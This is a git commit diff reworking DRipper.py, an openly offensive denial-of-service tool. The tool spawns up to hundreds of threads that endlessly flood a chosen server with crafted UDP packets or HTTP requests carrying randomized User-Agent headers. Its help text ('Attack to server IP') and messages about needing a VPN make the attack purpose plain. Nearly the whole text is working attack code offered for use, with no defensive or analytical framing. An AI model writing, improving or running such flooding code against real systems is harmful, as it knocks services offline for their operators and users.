60bd6c11a71103074184be96cc3dcef1c53eef6b
AlexNDRmac <alexndr.mac@gmail.com>
2022-03-02 19:12:07 +0200

    Rework logic

--- DRipper.py
+++ DRipper.py
@@ -19,52 +19,50 @@ class Context:
     host: str = ''
     port: int = 80
     threads: int = 100
-    random_packet_len: int = 0
+    random_packet_len: bool = False
     attack_method: str = ''
+    protocol: str = 'http://'
+    url: str = ''
 
     user_agents: list[str] = ''
-    headers = ''
+    base_headers = ''
+    headers = {}
 
 
 def init_context(_ctx, args):
     """Initialize Context from Input args."""
     _ctx.host = args[0].host
     _ctx.port = args[0].port
+    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
+    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"
+
     _ctx.threads = args[0].threads
+
     _ctx.attack_method = args[0].attack_method
-    _ctx.random_packet_len = args[0].random_packet_len
-    _ctx.user_agents = user_agent()
-    _ctx.headers = headers()
+    _ctx.random_packet_len = bool(args[0].random_packet_len)
+
+    _ctx.user_agents = readfile('useragents.txt')
+    _ctx.base_headers = readfile('headers.txt')
+    _ctx.headers = set_headers_dict(_ctx.base_headers)
 
 
-def user_agent():
-    """Read User-Agent string from file."""
-    uagents = open("useragents.txt", "r")
-    uagent = uagents.readlines()
-    uagents.close()
+def readfile(filename: str):
+    """Read string from file."""
+    file = open(filename, "r")
+    content = file.readlines()
+    file.close()
 
-    return uagent
-
-
-def headers():
-    """Reading headers from file."""
-    headers = open("headers.txt", "r")
-    data = headers.read()
-    headers.close()
-
-    return data
+    return content
 
 
-def set_headers_dict():
-    # reading headers
-    global headers_dict
-    headers = open("headers.txt", "r")
-    content = headers.readlines()
+def set_headers_dict(base_headers: list[str]):
+    """Set headers for the request"""
     headers_dict = {}
-    for item in content:
-        parts = item.split(':')
+    for line in base_headers:
+        parts = line.split(':')
         headers_dict[parts[0]] = parts[1].strip()
-    headers.close()
+
+    return headers_dict
 
 
 def get_random_string(len_from, len_to):
@@ -81,53 +79,46 @@ def get_random_port():
     return random.choice(ports)
 
 
-def down_it_udp():
+def down_it_udp(_ctx):
     i = 1
     while True:
-        if random_packet_len:
-            extra_data = get_random_string(0, 50000)
-        else:
-            extra_data = ''
+        extra_data = get_random_string(0, 5000) if _ctx.random_packet_len else ''
+
         packet = str(
-            "GET / HTTP/1.1\nHost: " + host
+            "GET / HTTP/1.1\nHost: " + _ctx.host
             + "\n\n User-Agent: "
-            + random.choice(uagent)
-            + "\n" + data
+            + random.choice(_ctx.user_agents)
+            + "\n" + _ctx.base_headers[0]
             + "\n\n" + extra_data).encode('utf-8')
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        p = int(port) if port else get_random_port()
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # p = int(_ctx.port) if _ctx.port else get_random_port()
         try:
-            s.sendto(packet, (host, p))
+            sock.sendto(packet, (_ctx.host, _ctx.port))
         except socket.gaierror:
             print("\033[91mCan't get server IP. Packet sending failed. Check your VPN.\033[0m")
         else:
             print('\033[92m Packet was sent \033[0;0m')
-        s.close()
+        sock.close()
 
-        if port:
+        if _ctx.port:
             i += 1
             if i == 50:
                 i = 1
-                thread = threading.Thread(target=connect_host)
+                thread = threading.Thread(target=connect_host, args=[_ctx.host, _ctx.port])
                 thread.daemon = True
                 thread.start()
         time.sleep(.01)
 
 
-def down_it_http():
+def down_it_http(_ctx):
     while True:
-        protocol = 'http://'
-        if port == 443:
-            protocol = 'https://'
-
-        url = f"{protocol}{host}:{port}"
-        http_headers = headers_dict
-        http_headers['User-Agent'] = random.choice(uagent).strip()
+        http_headers = _ctx.headers
+        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
 
         try:
             urllib.request.urlopen(
-                urllib.request.Request(url, headers=http_headers)
-            )
+                urllib.request.Request(_ctx.url, headers=http_headers))
         except:
             print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
                   " Program will continue working.\033[0m")
@@ -175,7 +166,7 @@ def parser_add_options(parser):
                       dest='threads', type='int', default=100,
                       help='threads (default: 100)')
     parser.add_option('-r', '--random_len',
-                      dest='random_packet__len', type='int',
+                      dest='random_packet_len', type='int',
                       help='Send random packets with random length')
     parser.add_option('-m', '--method',
                       dest='attack_method', type='str', default='udp',
@@ -183,51 +174,6 @@ def parser_add_options(parser):
     parser.add_option('-s', '--server',
                       dest='host',
                       help='Attack to server IP')
-
-
-def get_parameters():
-    global host
-    global port
-    global thr
-    global item
-    global random_packet_len
-    global attack_method
-    global headers_dict
-    optp = OptionParser(add_help_option=False, epilog="Rippers")
-    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
-    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
-    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
-    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
-    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
-                    help="Send random packets with random length")
-    optp.add_option("-m", "--method", type="str", dest="attack_method",
-                    help="Attack method: udp (default), http")
-    opts, args = optp.parse_args()
-    if opts.help:
-        usage()
-    if opts.host is not None:
-        host = opts.host
-    else:
-        usage()
-    if opts.port is None:
-        port = None
-    else:
-        port = opts.port
-
-    if opts.threads is None:
-        thr = 100
-    else:
-        thr = opts.threads
-
-    if opts.random_packet_len:
-        random_packet_len = True
-    else:
-        random_packet_len = False
-
-    if opts.attack_method and opts.attack_method in ['udp', 'http']:
-        attack_method = opts.attack_method
-    else:
-        attack_method = 'udp'
 
 
 def check_host(host):
@@ -260,32 +206,28 @@ def main():
     args = parse_args(parser)
 
     if len(sys.argv) < 2:
-        usage()
-    get_parameters()
+        usage(parser)
 
-    if not check_host():
-        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
-        exit()
+    _ctx = Context()
+    init_context(_ctx, args)
 
-    if port:
-        connect_host()
+    check_host(_ctx.host)
+    connect_host(_ctx.host, _ctx.port)
 
-    p = str(port) if port else '(22, 53, 80, 443)'
-    print("\033[92m", host, " port: ", p, " threads: ", str(thr), "\033[0m")
+    # p = str(_port) if _port else '(22, 53, 80, 443)'
+    print("\033[92m", _ctx.host, " port: ", _ctx.port, " threads: ", _ctx.threads, "\033[0m")
     print("\033[94mPlease wait...\033[0m")
-    user_agent()
-    headers()
-    time.sleep(5)
 
-    thrs = []
-    for i in range(int(thr)):
-        if attack_method == 'udp':
-            thrs.append(threading.Thread(target=down_it_udp))
-        elif attack_method == 'http':
-            set_headers_dict()
-            thrs.append(threading.Thread(target=down_it_http))
-        thrs[i].daemon = True  # if thread is exist, it dies
-        thrs[i].start()
+    time.sleep(3)
+
+    thread_pool = []
+    for i in range(int(_ctx.threads)):
+        if _ctx.attack_method == 'udp':
+            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))
+        elif _ctx.attack_method == 'http':
+            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
+        thread_pool[i].daemon = True  # if thread is exist, it dies
+        thread_pool[i].start()
 
     while True:
         time.sleep(.1)
